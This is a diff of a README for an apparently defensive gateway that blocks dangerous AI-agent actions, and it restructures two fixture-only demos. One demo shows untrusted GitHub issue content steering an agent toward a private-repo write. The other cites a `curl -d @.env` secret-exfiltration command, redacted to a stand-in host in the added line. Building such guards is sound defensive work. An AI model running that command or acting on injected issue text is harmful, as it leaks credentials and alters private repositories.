@@ -56,22 +56,35 @@ No credentials. No live calls. No real mutations. Each demo prints a
 states (a clean checkout shows `doctor` surfaces as `warn`, and
 `evidence verify` reports `parsed_records: 0` — both are normal).
 
-## See Boundary Deny Before Upstream
-
-![Boundary denies a GitHub write-after-taint action before upstream execution, with upstream_called=false and a hash-verifiable decision record](./docs/assets/github-lethal-trifecta-demo.gif)
-
-This fixture-safe demo shows untrusted GitHub issue context flowing into a private-repo mutation attempt. Boundary denies the routed action before GitHub is touched, reports `upstream_called=false`, and emits a hash-verifiable decision record. No credentials, live calls, or real mutations are used.
-
-A static [deny-before-upstream walkthrough](./docs/assets/boundary-demo-walkthrough.svg) is available as a no-JS fallback. The recording above is a real run of `boundary demo github-lethal-trifecta`; the walkthrough is a stylized diagram, not a literal capture.
-
 ## Two Proof Lanes
 
-The launch is a tight spine of **two fixture-only proof lanes** — not a breadth-of-adapters list. Each denies a real dangerous action before it runs and emits a hash-verifiable decision record. Everything else ships as a labeled preview (see [Adapter Readiness](#adapter-readiness)).
+The launch is a tight spine of **two fixture-only proof lanes** — not a breadth-of-adapters list. Each denies a dangerous action pattern before it runs and emits a hash-verifiable decision record. The two lanes carry equal weight: **Lane 1** is the MCP route (the first production route) and **Lane 2** is Command Boundary (a delivered preview). Everything else ships as a labeled preview (see [Adapter Readiness](#adapter-readiness)).
+
+![Two equal-weight proof lanes — Lane 1 (MCP, the first production route) denies a write-after-taint GitHub action before upstream with upstream_called=false; Lane 2 (Command Boundary, a delivered preview) denies a routed secret-exfiltration command before execution with executed=false. Both are fixture-only, use no credentials, make no network calls, perform no live mutation, and emit a hash-verifiable decision record.](./docs/assets/two-lane-proof.svg)
 
 | Lane | Status | Demo | What is denied | Verified shape |
 |---|---|---|---|---|
-| **MCP** — the first production route | Production | `boundary demo github-lethal-trifecta` | A write-after-taint GitHub action, denied **before upstream** | `actual=DENY`, `upstream_called=false`, `reason=lethal_trifecta_detected` |
-| **Command Boundary** — a delivered preview (routed-only) | Delivered preview | `boundary demo command-secret-exfil` | A routed `curl -d @.env …` secret exfiltration, denied **before execution** | `actual=DENY`, `executed=false`, `class=C6` |
+| **Lane 1 — MCP** (the first production route) | Production | `boundary demo github-lethal-trifecta` | A write-after-taint GitHub action, denied **before upstream** | `actual=DENY`, `upstream_called=false`, `reason=lethal_trifecta_detected` |
+| **Lane 2 — Command Boundary** (a delivered preview, routed-only) | Delivered preview | `boundary demo command-secret-exfil` | A routed `curl -d [redacted] https://example.invalid` secret exfiltration, denied **before execution** | `actual=DENY`, `executed=false`, `class=C6` |
+
+Both lanes are fixture-only: no credentials, no network, no live mutation, each
+emitting a `rec_...` decision record with a `sha256:` decision hash. The static
+poster above renders both lanes at equal weight; if it has not been generated
+yet, the two-lane table above is the canonical proof. A linear, single-lane
+[deny-before-upstream walkthrough](./docs/assets/boundary-demo-walkthrough.svg)
+is also available as a no-JS fallback for the MCP lane; it is a stylized diagram,
+not a literal capture.
+
+## Terminal Receipt — See the MCP Lane Run
+
+This recording is a real run of `boundary demo github-lethal-trifecta`, the
+Lane 1 (MCP) demo above. It shows untrusted GitHub issue context flowing into a
+private-repo mutation attempt; Boundary denies the routed action before GitHub
+is touched, reports `upstream_called=false`, and emits a hash-verifiable decision
+record. No credentials, live calls, or real mutations are used. For the Lane 2
+(Command Boundary) run, use `boundary demo command-secret-exfil`.
+
+![Boundary denies a GitHub write-after-taint action before upstream execution, with upstream_called=false and a hash-verifiable decision record](./docs/assets/github-lethal-trifecta-demo.gif)
 
 ## The Record It Leaves
 
